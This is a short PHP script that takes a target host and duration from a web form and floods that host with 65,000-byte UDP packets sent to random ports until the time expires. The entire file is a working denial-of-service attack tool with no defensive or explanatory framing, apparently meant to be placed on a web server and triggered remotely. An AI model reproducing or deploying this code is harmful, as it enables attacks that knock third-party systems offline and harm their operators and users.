<?php
if(isset($_POST['host']) && isset($_POST['time'])){
$packets = 0;
set_time_limit(0);
$exec_time = $_POST['time'];
$time = time();
$max_time = $time+$exec_time;
$host = $_POST['host'];
for($i=0;$i<65000;$i++){$out .= 'X';}
while(1){$packets++;if(time() > $max_time){break;}
$rand = rand(1,65000);
$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
if($fp){fwrite($fp, $out);fclose($fp);}
}
}
?>